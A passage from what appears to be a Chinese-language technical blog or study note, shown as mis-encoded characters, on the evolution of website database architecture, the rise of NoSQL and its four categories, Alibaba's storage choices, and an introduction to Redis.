<li><p>åœ¨æ—©æœŸ90å¹´ä»£ï¼Œä¸€ä¸ªç½‘ç«™çš„è®¿é—®é‡ä¸€èˆ¬éƒ½ä¸å¤§ï¼Œç”¨å•ä¸ªæ•°æ®åº“å®Œå…¨å¤Ÿç”¨ã€‚</p>
</li>
<li><p>åœ¨é‚£ä¸ªæ—¶ä»£ï¼Œç½‘ç«™æ›´å¤šä½¿ç”¨çš„éƒ½æ˜¯é™æ€ç½‘é¡µï¼ŒåŠ¨æ€äº¤äº’å‹ç•Œé¢ä½¿ç”¨ä¸å¤šã€‚</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/74ae8f5de7c59c31894dc4916eb11691--7826--image-20240917194252427.png" alt="image-20240917194252427"></p>
<blockquote>
<p>DALï¼šData Access Layerï¼ˆæ•°æ®è®¿é—®å±‚-Hibernateï¼ŒMybatisï¼‰</p>
</blockquote>
<p>ä½†ä½¿ç”¨è¯¥æ¶æ„çš„æƒ…å†µä¸‹ï¼Œä¹Ÿéšä¹‹å­˜åœ¨ä¸å°‘é—®é¢˜ï¼Œç½‘ç«™å­˜åœ¨å¯¹åº”çš„ç“¶é¢ˆ</p>
<ol>
<li>æ•°æ®é‡çš„æ€»å¤§å°ä¸€ä¸ªæœºå™¨æ”¾ä¸ä¸‹æ—¶</li>
<li>æ•°æ®çš„ç´¢å¼•ï¼ˆB+Treeï¼‰ä¸€ä¸ªæœºå™¨çš„å†…å­˜æ”¾ä¸ä¸‹æ—¶</li>
<li>è®¿é—®é‡ï¼ˆè¯»å†™æ··åˆï¼‰ä¸€ä¸ªå®ä¾‹Mysqlä¸èƒ½æ¥å—</li>
</ol>
<p>åªè¦å‡ºç°ä¸Šè¿°ä¸‰ç§æƒ…å†µä¹‹ä¸€ï¼Œå¯èƒ½å°±ä¼šå¯¼è‡´ç½‘ç«™çš„æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œåªèƒ½å¯¹æ•°æ®åº“çš„æ•´ä½“æ¶æ„è¿›è¡Œé‡æ„</p>
<blockquote>
<p>2ã€memcachedï¼ˆç¼“å­˜ï¼‰+mysql+å‚ç›´æ‹†åˆ†ï¼ˆè¯»å†™åˆ†ç¦»ï¼‰</p>
</blockquote>
<ul>
<li>éšç€ç½‘ç«™è®¿é—®é‡çš„ä¸æ–­ä¸Šå‡ï¼Œå‡ ä¹å¤§éƒ¨åˆ†ä½¿ç”¨å•æœºmysqlæ¶æ„çš„ç½‘ç«™åœ¨æ•°æ®åº“ä¸Šéƒ½å‡ºç°äº†æ€§èƒ½é—®é¢˜</li>
<li>éšä¹‹è€Œæ¥çš„å®é™…ï¼Œä½¿ç”¨ç¼“å­˜æŠ€æœ¯æ¥ç¯èŠ‚æ•°æ®åº“çš„å‹åŠ›ï¼Œä¼˜åŒ–æ•°æ®åº“ç»“æ„å’Œç´¢å¼•ã€‚ã€‚å¼€å§‹æ¯”è¾ƒæµè¡Œçš„æ˜¯é€šè¿‡æ–‡ä»¶ç¼“å­˜æ¥ç¼“è§£æ•°æ®åº“å‹åŠ›ï¼Œä½†æ˜¯å½“è®¿é—®é‡ç»§ç»­å¢å¤§çš„æ—¶å€™ï¼Œå¤šå°webæœºå™¨é€šè¿‡æ–‡ä»¶ç¼“å­˜ä¸èƒ½å…±äº«ï¼Œå¤§é‡çš„å°æ–‡ä»¶ç¼“å­˜ä¹Ÿå¸¦äº†äº†æ¯”è¾ƒé«˜çš„IOå‹åŠ›ã€‚</li>
<li>åœ¨è¿™ä¸ªæ—¶å€™ï¼ŒMemcachedå°±è‡ªç„¶çš„æˆä¸ºä¸€ä¸ªéå¸¸æ—¶å°šçš„æŠ€æœ¯äº§å“ã€‚</li>
<li>ç½‘ç«™80%çš„æƒ…å†µéƒ½æ˜¯åœ¨è¯»ï¼Œæ¯æ¬¡éƒ½è¦å»æŸ¥è¯¢æ•°æ®åº“çš„è¯å°±ååˆ†çš„éº»çƒ¦ï¼æ‰€ä»¥è¯´æˆ‘ä»¬å¸Œæœ›å‡è½»æ•°æ®çš„å‹åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¼“å­˜æ¥ä¿è¯æ•ˆç‡ï¼</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/13b5c05c18f27f7137ded7fa5cab0482--f695--image-20240917195408498.png" alt="image-20240917195408498"></p>
<ul>
<li>Memcachedä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„åˆ†å¸ƒå¼çš„ç¼“å­˜æœåŠ¡å™¨ï¼Œä¸ºå¤šä¸ªwebæœåŠ¡å™¨æä¾›äº†ä¸€ä¸ªå…±äº«çš„é«˜æ€§èƒ½ç¼“å­˜æœåŠ¡ï¼Œåœ¨MemcachedæœåŠ¡å™¨ä¸Šï¼Œåˆå‘å±•äº†æ ¹æ®hashç®—æ³•æ¥è¿›è¡Œå¤šå°Memcachedç¼“å­˜æœåŠ¡çš„æ‰©å±•ï¼Œç„¶ååˆå‡ºç°äº†ä¸€è‡´æ€§hashæ¥è§£å†³å¢åŠ æˆ–å‡å°‘ç¼“å­˜æœåŠ¡å™¨å¯¼è‡´é‡æ–°hashå¸¦æ¥çš„å¤§é‡ç¼“å­˜å¤±æ•ˆçš„å¼Šç«¯ã€‚</li>
<li>ç”±äºæ•°æ®åº“çš„å†™å…¥å‹åŠ›å¢åŠ ï¼ŒMemcachedåªèƒ½ç¼“è§£æ•°æ®åº“çš„è¯»å–å‹åŠ›ã€‚è¯»å†™é›†ä¸­åœ¨ä¸€ä¸ªæ•°æ®åº“ä¸Šè®©æ•°æ®åº“ä¸å ªé‡è´Ÿï¼Œå¤§éƒ¨åˆ†ç½‘ç«™å¼€å§‹ä½¿ç”¨ä¸»ä»å¤åˆ¶æŠ€æœ¯æ¥è¾¾åˆ°<strong>è¯»å†™åˆ†ç¦»</strong>ï¼Œä»¥æé«˜è¯»å†™æ€§èƒ½å’Œè¯»åº“çš„å¯æ‰©å±•æ€§ã€‚Mysqlçš„master-slaveæ¨¡å¼æˆä¸ºè¿™ä¸ªæ—¶å€™çš„ç½‘ç«™æ ‡é…äº†ã€‚</li>
</ul>
<blockquote>
<p>3ã€åˆ†åº“åˆ†è¡¨+æ°´å¹³æ‹†åˆ†+mysqlé›†ç¾¤</p>
</blockquote>
<ul>
<li>æœ¬è´¨ï¼šæ•°æ®åº“çš„è¯»å†™</li>
<li>æ—©äº›å¹´çš„MyISAMï¼šè¡¨é”ï¼Œååˆ†å½±å“æ•ˆç‡ï¼Œé«˜å¹¶å‘æƒ…å†µä¸‹å°±ä¼šå‡ºç°ä¸¥é‡çš„é”é—®é¢˜</li>
<li>å½“ä¸‹çš„è½¬æˆ˜Innodbï¼šè¡Œé”</li>
<li>æŠ€æœ¯å’Œä¸šåŠ¡åœ¨å‘å±•çš„åŒæ—¶ï¼Œå¯¹äººçš„è¦æ±‚ä¹Ÿè¶Šæ¥è¶Šé«˜ï¼</li>
<li>æ…¢æ…¢çš„å°±å¼€å§‹ä½¿ç”¨åˆ†åº“åˆ†è¡¨æ¥è§£å†³å†™çš„å‹åŠ›ï¼MySQLåœ¨æŸä¸ªå¹´ä»£æ¨å‡ºäº†è¡¨åˆ†åŒºï¼Œä½†å¹¶æ²¡æœ‰ä»€ä¹ˆå…¬å¸ç”¨ï¼</li>
<li>ä¸ºæ»¡è¶³éœ€æ±‚ï¼Œéšä¹‹è¯ç”Ÿçš„åˆ™æ˜¯MySQLçš„é›†ç¾¤ï¼Œå¾ˆå¥½æ»¡è¶³é‚£ä¸ªæ—¶ä»£çš„æ‰€æœ‰éœ€æ±‚ï¼</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/66ca9710d7e23fe4ea3cec952545b379--1556--image-20240917200604469.png" alt="image-20240917200604469"></p>
<blockquote>
<p>4ã€å¦‚ä»Šæœ€è¿‘çš„å¹´ä»£</p>
</blockquote>
<ul>
<li>2010-2020åå¹´ä¹‹é—´ï¼Œä¸–ç•Œå·²ç»å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ï¼›ï¼ˆå®šä½ï¼ŒéŸ³ä¹ã€‚çƒ­æ¦œä¹Ÿæ˜¯ä¸€ç§æ•°æ®ï¼‰</li>
<li>MySQLç­‰å…³ç³»å‹æ•°æ®åº“å°±ä¸å¤Ÿç”¨äº†ï¼å½“ä¸‹æ•°æ®é‡å¾ˆå¤šï¼ˆå¤§æ•°æ®æ—¶ä»£ï¼‰ï¼Œå˜åŒ–å¾ˆå¿«ï¼</li>
<li>MySQLç”¨å®ƒå­˜å‚¨ä¸€äº›æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œæ•ˆç‡å°±ä½äº†ï¼Œæ¯”å¦‚åšå®¢ï¼Œå›¾ç‰‡ç­‰ï¼å¦‚æœæœ‰ä¸€ç§æ•°æ®åº“å»ä¸“é—¨å¤„ç†è¿™ç§æ•°æ®ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/7fdcc82c9489aaca67f2f368789f63f1--03fc--image-20240917202025446.png" alt="image-20240917202025446"></p>
<p>æœ€å‰é¢çš„æ˜¯ä¼ä¸šçº§é˜²ç«å¢™ï¼Œåé¢é€šè¿‡è´Ÿè½½å‡è¡¡ä¸»æœºï¼ˆè½¯è´Ÿè½½ï¼šNginxï¼Œç¡¬è´Ÿè½½ï¼šF5ï¼‰åœ¨ web æœåŠ¡å™¨é›†ç¾¤ä¹‹é—´è¿›è¡Œè°ƒåº¦ï¼Œå†ç”±å…·ä½“çš„ web æœåŠ¡å™¨ï¼ˆTomcatï¼‰å»è®¿é—®ç¼“å­˜ï¼Œè®¿é—®æ•°æ®åº“ã€‚</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦nosql</p>
</blockquote>
<p>ä»Šå¤©æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆå¦‚ï¼šGoogle,Facebookç­‰ï¼‰å¯ä»¥å¾ˆå®¹æ˜“çš„è®¿é—®å’ŒæŠ“å–æ•°æ®ã€‚ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œç¤¾äº¤ç½‘ç»œï¼Œåœ°ç†ä½ç½®ï¼Œç”¨æˆ·ç”Ÿæˆçš„æ•°æ®å’Œç”¨æˆ·æ“ä½œæ—¥å¿—å·²ç»æˆå€çš„å¢åŠ ã€‚æˆ‘ä»¬å¦‚æœè¦å¯¹è¿™äº›ç”¨æˆ·æ•°æ®è¿›è¡ŒæŒ–æ˜ï¼Œé‚£SQLæ•°æ®åº“å·²ç»ä¸é€‚åˆè¿™äº›åº”ç”¨äº†, NoSQLæ•°æ®åº“çš„å‘å±•ä¹Ÿå´èƒ½å¾ˆå¥½çš„å¤„ç†è¿™äº›å¤§çš„æ•°æ®ã€‚</p>
<h2 id="2ã€ä»€ä¹ˆæ˜¯NoSQL"><a href="#2ã€ä»€ä¹ˆæ˜¯NoSQL" class="headerlink" title="2ã€ä»€ä¹ˆæ˜¯NoSQL"></a>2ã€ä»€ä¹ˆæ˜¯NoSQL</h2><blockquote>
<p>NoSQL</p>
</blockquote>
<p>NoSQL &#x3D; Not Only SQLï¼ˆä¸ä»…ä»…æ˜¯SQLï¼‰</p>
<p>å…³ç³»å‹æ•°æ®åº“ï¼šè¡¨æ ¼ ï¼ˆè¡Œ ï¼Œåˆ—ï¼‰</p>
<p>æ³›æŒ‡éå…³ç³»å‹æ•°æ®åº“çš„ï¼Œéšç€web2.0äº’è”ç½‘çš„è¯ç”Ÿï¼ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“å¾ˆéš¾å¯¹ä»˜web2.0æ—¶ä»£ï¼å°¤å…¶æ˜¯è¶…å¤§è§„æ¨¡çš„é«˜å¹¶å‘çš„ç¤¾åŒºï¼ æš´éœ²å‡ºæ¥å¾ˆå¤šéš¾ä»¥å…‹æœçš„é—®é¢˜ï¼ŒNoSQLåœ¨å½“ä»Šå¤§æ•°æ®ç¯å¢ƒä¸‹å‘å±•çš„ååˆ†è¿…é€Ÿï¼ŒRedisæ˜¯å‘å±•æœ€å¿«çš„ï¼Œè€Œä¸”æ˜¯æˆ‘ä»¬å½“ä¸‹å¿…é¡»è¦æŒæ¡çš„ä¸€ä¸ªæŠ€æœ¯ï¼</p>
<p>å¾ˆå¤šçš„æ•°æ®ç±»å‹ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œç¤¾äº¤ç½‘ç»œï¼Œåœ°ç†ä½ç½®ã€‚è¿™äº›æ•°æ®ç±»å‹çš„å­˜å‚¨ä¸éœ€è¦ä¸€ä¸ªå›ºå®šçš„æ ¼å¼ï¼ä¸éœ€è¦å¤šä½™çš„æ“ä½œå°±å¯ä»¥æ¨ªå‘æ‰©å±•çš„ ï¼ <strong>Map&lt;String,Object&gt; ä½¿ç”¨é”®å€¼å¯¹æ¥æ§åˆ¶ï¼</strong></p>
<blockquote>
<p>NoSQLç‰¹ç‚¹</p>
</blockquote>
<p><strong>è§£è€¦ï¼ï¼</strong></p>
<ul>
<li><p>æ–¹ä¾¿æ‹“å±•ï¼ˆæ•°æ®ä¹‹é—´æ²¡æœ‰å…³ç³»ï¼Œå¾ˆå¥½æ‰©å±•ï¼ï¼‰</p>
</li>
<li><p>å¤§æ•°æ®é‡é«˜æ€§èƒ½ï¼ˆRedisä¸€ç§’å†™8ä¸‡æ¬¡ï¼Œè¯»å–11ä¸‡ï¼ŒNoSQLçš„ç¼“å­˜è®°å½•çº§ï¼Œæ˜¯ä¸€ç§ç»†ç²’åº¦çš„ç¼“å­˜ï¼Œæ€§èƒ½ä¼šæ¯”è¾ƒé«˜ï¼‰</p>
</li>
<li><p>æ•°æ®ç±»å‹æ˜¯å¤šæ ·å‹çš„ï¼ï¼ˆä¸éœ€è¦äº‹å…ˆè®¾è®¡æ•°æ®åº“ï¼éšå–éšç”¨ï¼å¦‚æœæ•°æ®é‡éå¸¸å¤§çš„è¡¨ï¼Œå¾ˆå¤šäººå°±æ— æ³•è®¾è®¡äº†ï¼‰</p>
</li>
<li><p>ä¼ ç»ŸRDBMSï¼ˆå…³ç³»å‹æ•°æ®åº“ï¼‰å’ŒNoSQLçš„å¯¹æ¯”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ä¼ ç»Ÿçš„ RDBMS</span><br><span class="line">- é«˜åº¦ç»„ç»‡åŒ–ç»“æ„åŒ–æ•°æ®</span><br><span class="line">- ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼ˆSQLï¼‰</span><br><span class="line">- æ•°æ®å’Œå…³ç³»éƒ½å­˜å‚¨åœ¨å•ç‹¬çš„è¡¨ä¸­ã€‚</span><br><span class="line">- æ•°æ®æ“çºµè¯­è¨€ï¼Œæ•°æ®å®šä¹‰è¯­è¨€</span><br><span class="line">- ä¸¥æ ¼çš„ä¸€è‡´æ€§</span><br><span class="line">- åŸºç¡€äº‹åŠ¡ </span><br><span class="line">- .....</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nosql </span><br><span class="line">- ä»£è¡¨ç€ä¸ä»…ä»…æ˜¯SQL</span><br><span class="line">- æ²¡æœ‰å£°æ˜æ€§æŸ¥è¯¢è¯­è¨€</span><br><span class="line">- æ²¡æœ‰é¢„å®šä¹‰çš„æ¨¡å¼</span><br><span class="line">- é”®å€¼å¯¹å­˜å‚¨ï¼Œåˆ—å­˜å‚¨ï¼Œæ–‡æ¡£å­˜å‚¨ï¼Œå›¾å½¢æ•°æ®åº“</span><br><span class="line">- æœ€ç»ˆä¸€è‡´æ€§ï¼Œè€ŒéACIDå±æ€§</span><br><span class="line">- éç»“æ„åŒ–å’Œä¸å¯é¢„çŸ¥çš„æ•°æ®</span><br><span class="line">- CAPå®šç†(Cï¼šå¼ºä¸€è‡´æ€§ Aï¼šé«˜å¯ç”¨æ€§ Pï¼šåˆ†å¸ƒå¼å®¹å¿æ€§)</span><br><span class="line">- é«˜æ€§èƒ½ï¼Œé«˜å¯ç”¨æ€§å’Œå¯ä¼¸ç¼©æ€§</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>ç†è§£ï¼š3V+3é«˜</p>
</blockquote>
<p>å¤§æ•°æ®æ—¶ä»£çš„3Vï¼šä¸»è¦æ˜¯æè¿°é—®é¢˜çš„</p>
<ol>
<li>æµ·é‡Volume</li>
<li>å¤šæ ·Variety</li>
<li>å®æ—¶Velocity</li>
</ol>
<p>å¤§æ•°æ®æ—¶ä»£çš„3é«˜ï¼šä¸»è¦æ˜¯å¯¹ç¨‹åºçš„è¦æ±‚</p>
<ol>
<li><strong>é«˜å¹¶å‘</strong></li>
<li><strong>é«˜å¯æ‰©</strong></li>
<li><strong>é«˜æ€§èƒ½</strong></li>
</ol>
<p>çœŸæ­£åœ¨å…¬å¸ä¸­çš„å®è·µï¼šNoSQL + RDBMS ä¸€èµ·ä½¿ç”¨æ‰æ˜¯æœ€å¼ºçš„ï¼Œé˜¿é‡Œå·´å·´çš„æ¶æ„æ¼”è¿›ï¼</p>
<h2 id="3ã€é˜¿é‡Œå·´å·´æ¼”è¿›åˆ†æ"><a href="#3ã€é˜¿é‡Œå·´å·´æ¼”è¿›åˆ†æ" class="headerlink" title="3ã€é˜¿é‡Œå·´å·´æ¼”è¿›åˆ†æ"></a>3ã€é˜¿é‡Œå·´å·´æ¼”è¿›åˆ†æ</h2><p>æ€è€ƒé—®é¢˜ï¼šè¿™ä¹ˆå¤šä¸œè¥¿éš¾é“éƒ½æ˜¯åœ¨ä¸€ä¸ªæ•°æ®åº“ä¸­çš„å—?</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/4414c8742049d823bf81956bb7e3fb8b--cc92--image-20240917204812689.png" alt="image-20240917204812689"></p>
<p>æŠ€æœ¯æ€¥ä¸å¾—ï¼Œè¶Šæ˜¯æ…¢æ…¢å­¦ï¼Œæ‰èƒ½è¶Šæ‰å®ï¼</p>
<p>å¼€æºæ‰æ˜¯æŠ€æœ¯çš„ç‹é“ï¼</p>
<p>ä»»ä½•ä¸€å®¶äº’è”ç½‘çš„å…¬å¸ï¼Œéƒ½ä¸å¯èƒ½åªæ˜¯ç®€ç®€å•å•è®©ç”¨æˆ·èƒ½ç”¨å°±å¥½äº†</p>
<p>å¤§é‡å…¬å¸åšçš„éƒ½æ˜¯ç›¸åŒçš„ä¸šåŠ¡ï¼ˆç«å“åè®®ï¼‰</p>
<p>éšç€è¿™æ ·çš„ç«äº‰ï¼Œä¸šåŠ¡æ˜¯è¶Šæ¥è¶Šå®Œå–„ï¼Œç„¶åå¯¹äºå¼€å‘è€…çš„è¦æ±‚ä¹Ÿæ˜¯è¶Šæ¥è¶Šé«˜</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/b3e70a7822276f757b5937187b81f21f--63fe--image-20240917204835195.png" alt="image-20240917204835195"></p>
<p>å¦‚æœä½ æœªæ¥ç›¸å½“ä¸€ä¸ªæ¶æ„å¸ˆï¼š æ²¡æœ‰ä»€ä¹ˆæ˜¯åŠ ä¸€å±‚è§£å†³ä¸äº†çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1ã€å•†å“çš„åŸºæœ¬ä¿¡æ¯</span><br><span class="line">  åç§°ã€ä»·æ ¼ã€å•†å®¶ä¿¡æ¯</span><br><span class="line">  å…³ç³»å‹æ•°æ®åº“å°±å¯ä»¥è§£å†³äº†ï¼ MySQL / Oracle ï¼ˆæ·˜å®æ—©å¹´å°±å»IOEäº†ï¼- ç‹åšï¼šæ¨èæ–‡ç« ï¼šé˜¿é‡Œäº‘çš„è¿™ç¾¤ç–¯å­ï¼‰</span><br><span class="line">  æ·˜å®å†…éƒ¨çš„ MySQL ä¸æ˜¯å¤§å®¶ç”¨çš„ MySQL</span><br><span class="line"># 2ã€å•†å“çš„æè¿°ã€è¯„è®ºï¼ˆæ–‡å­—æ¯”è¾ƒå¤šï¼‰</span><br><span class="line">  æ–‡æ¡£å‹æ•°æ®åº“ä¸­ï¼ŒMongoDB</span><br><span class="line"># 3ã€å›¾ç‰‡</span><br><span class="line">  - åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ FastDFS</span><br><span class="line">  - æ·˜å®è‡ªå·±çš„ TFS</span><br><span class="line">  - Googleçš„ GFS</span><br><span class="line">  - Hadoop HDFS</span><br><span class="line">  - é˜¿é‡Œäº‘çš„ oss</span><br><span class="line"># 4ã€å•†å“çš„å…³é”®å­— ï¼ˆæœç´¢ï¼‰</span><br><span class="line">  - æœç´¢å¼•æ“ solr elasticsearch</span><br><span class="line">  - ISearchï¼šå¤šéš†ï¼ˆå¤šå»äº†è§£ä¸€ä¸‹è¿™äº›æŠ€æœ¯å¤§ä½¬ï¼ï¼‰</span><br><span class="line">  - æ‰€æœ‰ç‰›é€¼çš„äººéƒ½æœ‰ä¸€æ®µè‹¦é€¼çš„å²æœˆï¼ä½†æ˜¯ä½ åªè¦åƒSBä¸€æ ·çš„å»åšæŒï¼Œç»ˆå°†ç‰›é€¼ï¼</span><br><span class="line"># 5ã€å•†å“çƒ­é—¨ä¿¡æ¯</span><br><span class="line">  - å†…å­˜æ•°æ®åº“</span><br><span class="line">  - Redisã€ Tairã€Memache...</span><br><span class="line"># 6ã€å•†å“çš„äº¤æ˜“ï¼Œå¤–éƒ¨çš„æ”¯ä»˜æ¥å£</span><br><span class="line">  - ä¸‰æ–¹åº”ç”¨ </span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>è¦çŸ¥é“ï¼Œä¸€ä¸ªç®€å•åœ°ç½‘é¡µèƒŒåçš„æŠ€æœ¯ä¸€å®šä¸æ˜¯å¤§å®¶æ‰€æƒ³çš„é‚£ä¹ˆç®€å•</p>
<p>å¤§å‹äº’è”ç½‘åº”ç”¨é—®é¢˜</p>
<ul>
<li>æ•°æ®ç±»å‹å¤ªå¤šäº†</li>
<li>æ•°æ®æºç¹å¤šï¼Œç»å¸¸é‡æ„</li>
<li>æ•°æ®è¦æ”¹é€ ï¼Œå¤§é¢ç§¯æ”¹é€ </li>
</ul>
<p>è§£å†³é—®é¢˜ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/a4cce34dabdbf7356b024032970e5231--14a5--image-20240917204845891.png" alt="image-20240917204845891"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/d7215a33aceaa04e565ac394bff08bf1--643b--image-20240917204854879.png" alt="image-20240917204854879"></p>
<p>è¿™é‡Œä»¥ä¸Šéƒ½æ˜¯NoSQLå…¥é—¨æ¦‚è¿°ï¼Œä¸ä»…èƒ½å¤Ÿæé«˜å¤§å®¶çš„çŸ¥è¯†ï¼Œè¿˜å¯ä»¥å¸®åŠ©å¤§å®¶äº†è§£å¤§å‚çš„å·¥ä½œå†…å®¹</p>
<h2 id="4ã€NoSQLçš„å››å¤§åˆ†ç±»"><a href="#4ã€NoSQLçš„å››å¤§åˆ†ç±»" class="headerlink" title="4ã€NoSQLçš„å››å¤§åˆ†ç±»"></a>4ã€NoSQLçš„å››å¤§åˆ†ç±»</h2><ol>
<li><p>é”®å€¼(Key-Value)å­˜å‚¨æ•°æ®åº“</p>
<p><strong>è¿™ä¸€ç±»æ•°æ®åº“ä¸»è¦ä¼šä½¿ç”¨åˆ°ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œè¿™ä¸ªè¡¨ä¸­æœ‰ä¸€ä¸ªç‰¹å®šçš„é”®å’Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ç‰¹å®šçš„æ•°æ®</strong>ã€‚Key&#x2F;valueæ¨¡å‹å¯¹äºITç³»ç»Ÿæ¥è¯´çš„ä¼˜åŠ¿åœ¨äºç®€å•ã€æ˜“éƒ¨ç½²ã€‚ä½†æ˜¯å¦‚æœDBAï¼ˆæ•°æ®åº“ç®¡ç†å‘˜ï¼‰åªå¯¹éƒ¨åˆ†å€¼è¿›è¡ŒæŸ¥è¯¢æˆ–æ›´æ–°çš„æ—¶å€™ï¼ŒKey&#x2F;valueå°±æ˜¾å¾—æ•ˆç‡ä½ä¸‹äº†ã€‚ä¸¾ä¾‹å¦‚ï¼šTokyo Cabinet&#x2F;Tyrant, <strong>Redis</strong>, Voldemort, Oracle BDB</p>
</li>
<li><p>åˆ—å­˜å‚¨æ•°æ®åº“</p>
<p>è¿™éƒ¨åˆ†æ•°æ®åº“é€šå¸¸æ˜¯ç”¨æ¥åº”å¯¹åˆ†å¸ƒå¼å­˜å‚¨çš„æµ·é‡æ•°æ®ã€‚é”®ä»ç„¶å­˜åœ¨ï¼Œä½†æ˜¯å®ƒä»¬çš„ç‰¹ç‚¹æ˜¯æŒ‡å‘äº†å¤šä¸ªåˆ—ã€‚è¿™äº›åˆ—æ˜¯ç”±åˆ—å®¶æ—æ¥å®‰æ’çš„ã€‚å¦‚ï¼šCassandra, <strong>HBase</strong>, Riak.</p>
</li>
<li><p>æ–‡æ¡£å‹æ•°æ®åº“</p>
<p>æ–‡æ¡£å‹æ•°æ®åº“çš„çµæ„Ÿæ˜¯æ¥è‡ªäºLotus NotesåŠå…¬è½¯ä»¶çš„ï¼Œè€Œä¸”å®ƒåŒç¬¬ä¸€ç§é”®å€¼å­˜å‚¨ç›¸ç±»ä¼¼ã€‚è¯¥ç±»å‹çš„æ•°æ®æ¨¡å‹æ˜¯ç‰ˆæœ¬åŒ–çš„æ–‡æ¡£ï¼ŒåŠç»“æ„åŒ–çš„æ–‡æ¡£ä»¥ç‰¹å®šçš„æ ¼å¼å­˜å‚¨ï¼Œæ¯”å¦‚JSONã€‚æ–‡æ¡£å‹æ•°æ®åº“å¯ ä»¥çœ‹ä½œæ˜¯é”®å€¼æ•°æ®åº“çš„å‡çº§ç‰ˆï¼Œå…è®¸ä¹‹é—´åµŒå¥—é”®å€¼ã€‚è€Œä¸”æ–‡æ¡£å‹æ•°æ®åº“æ¯”é”®å€¼æ•°æ®åº“çš„æŸ¥è¯¢æ•ˆç‡æ›´é«˜ã€‚å¦‚ï¼šCouchDB, <strong>MongoDb</strong>. å›½å†…ä¹Ÿæœ‰æ–‡æ¡£å‹æ•°æ®åº“SequoiaDBï¼Œç›®å‰å·²ç»å¼€æº</p>
</li>
<li><p>å›¾å½¢(Graph)æ•°æ®åº“</p>
<p>å›¾å½¢ç»“æ„çš„æ•°æ®åº“åŒå…¶ä»–è¡Œåˆ—ä»¥åŠåˆšæ€§ç»“æ„çš„SQLæ•°æ®åº“ä¸åŒï¼Œå®ƒæ˜¯ä½¿ç”¨çµæ´»çš„å›¾å½¢æ¨¡å‹ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ‰©å±•åˆ°å¤šä¸ªæœåŠ¡å™¨ä¸Šã€‚NoSQLæ•°æ®åº“æ²¡æœ‰æ ‡å‡†çš„æŸ¥è¯¢è¯­è¨€(SQL)ï¼Œå› æ­¤è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢éœ€è¦åˆ¶å®šæ•°æ®æ¨¡å‹ã€‚è®¸å¤šNoSQLæ•°æ®åº“éƒ½æœ‰RESTå¼çš„æ•°æ®æ¥å£æˆ–è€…æŸ¥è¯¢APIã€‚ å¦‚ï¼š<strong>Neo4J</strong>, InfoGrid, Infinite Graph</p>
</li>
</ol>
<blockquote>
<p>å¯¹æ¯”</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/0b29faa408d9be60261b86f242bf839c--c4b5--image-20240917205245441.png" alt="image-20240917205245441"></p>
<h1 id="äºŒã€rediså…¥é—¨"><a href="#äºŒã€rediså…¥é—¨" class="headerlink" title="äºŒã€rediså…¥é—¨"></a>äºŒã€rediså…¥é—¨</h1><h2 id="1ã€æ¦‚è¿°"><a href="#1ã€æ¦‚è¿°" class="headerlink" title="1ã€æ¦‚è¿°"></a>1ã€æ¦‚è¿°</h2><blockquote>
<p>redisæ˜¯ä»€ä¹ˆï¼Ÿï¼Ÿ</p>
</blockquote>
<p><strong>Redis</strong>ï¼ˆRemote Dictionary Server )ï¼Œå³è¿œç¨‹å­—å…¸æœåŠ¡ !</p>
<p>æ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„API</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/2c859dce2432fbf1b9d4ad58eacad586--2e0a--image-20240917205629626.png" alt="image-20240917205629626"></p>
<p>redisä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†master-slave(ä¸»ä»)åŒæ­¥ã€‚</p>
<p>å…è´¹å’Œå¼€æºï¼æ˜¯å½“ä¸‹æœ€çƒ­é—¨çš„ NoSQL æŠ€æœ¯ä¹‹ä¸€ï¼ä¹Ÿè¢«äººä»¬ç§°ä¹‹ä¸ºç»“æ„åŒ–æ•°æ®åº“ï¼</p>
<blockquote>
